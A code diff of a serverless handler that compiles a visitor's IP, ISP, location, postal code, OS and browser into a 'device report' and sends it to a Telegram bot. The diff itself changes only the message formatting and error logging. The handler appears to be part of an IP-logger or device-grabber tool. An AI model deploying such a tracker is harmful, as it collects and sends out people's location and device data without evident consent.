@@ -23,17 +23,17 @@ export default async function handler(req, res) {
   const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Manila' });
 
   const message = `
-📡 *NEW DEVICE REPORT*
-🕒 *Time:* ${date}
+<b>📡 NEW DEVICE REPORT</b>
+<b>🕒 Time:</b> ${date}
 
-🌐 *Network Info*
+<b>🌐 Network Info</b>
 • IP: ${data.ip || 'Unknown'}
 • ISP: ${data.isp || 'Unknown'}
 • Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}
 • Timezone: ${data.timezone || 'Unknown'}
 • Postal: ${data.postal || 'Unknown'}
 
-💻 *Device Info*
+<b>💻 Device Info</b>
 • OS: ${data.os || 'Unknown'}
 • Browser: ${data.browser || 'Unknown'}
 • Mobile: ${String(data.mobile)}
@@ -50,13 +50,13 @@ export default async function handler(req, res) {
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text: message,
-      parse_mode: 'Markdown'
+      parse_mode: 'HTML'  // <--- safer than Markdown
     });
 
     console.log('[+] Sent device info to Telegram');
     return res.status(200).json({ success: true });
   } catch (err) {
-    console.error('[!] Failed to send to Telegram:', err.message);
+    console.error('[!] Failed to send to Telegram:', err.response?.data || err.message);
     return res.status(500).json({ error: 'Failed to send to Telegram' });
   }
 }
